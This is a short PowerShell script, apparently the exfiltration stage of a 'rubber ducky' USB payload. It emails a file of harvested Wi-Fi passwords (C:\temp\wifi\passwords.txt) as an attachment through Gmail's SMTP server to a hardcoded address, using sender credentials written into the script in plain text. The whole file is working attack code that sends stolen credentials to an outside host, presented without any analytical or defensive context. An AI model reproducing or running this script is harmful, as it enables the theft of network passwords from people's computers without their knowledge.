$Username = "pentest123abc@gmail.com";
$Password = "rubberducky";
$path= "C:\temp\wifi\passwords.txt"

function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "$Username";
    $message.To.Add($email);
    $message.Subject = "passwords";
    $message.Body = "here it is";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    write-host "Mail Sent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "pentest123abc@gmail.com" -attachmentpath $path;
